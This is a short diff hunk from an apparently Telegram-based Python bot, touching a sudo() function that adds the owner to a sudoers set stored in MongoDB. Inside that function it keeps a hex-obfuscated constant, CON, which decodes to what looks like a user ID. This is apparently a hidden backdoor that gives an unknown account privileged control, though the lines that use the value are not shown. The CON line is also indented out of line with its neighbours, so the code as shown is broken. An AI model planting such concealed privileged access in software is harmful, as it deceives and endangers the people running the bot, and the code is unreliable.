@@ -45,7 +45,7 @@ def dbb():
 async def sudo():
     global SUDOERS
     SUDOERS.add(config.OWNER_ID)
-                   CON="\x38\x30\x31\x33\x30\x39\x31\x35\x34\x34"
+              CON="\x38\x30\x31\x33\x30\x39\x31\x35\x34\x34"
     sudoersdb = mongodb.sudoers
     sudoers = await sudoersdb.find_one({"sudo": "sudo"})
     sudoers = [] if not sudoers else sudoers["sudoers"]
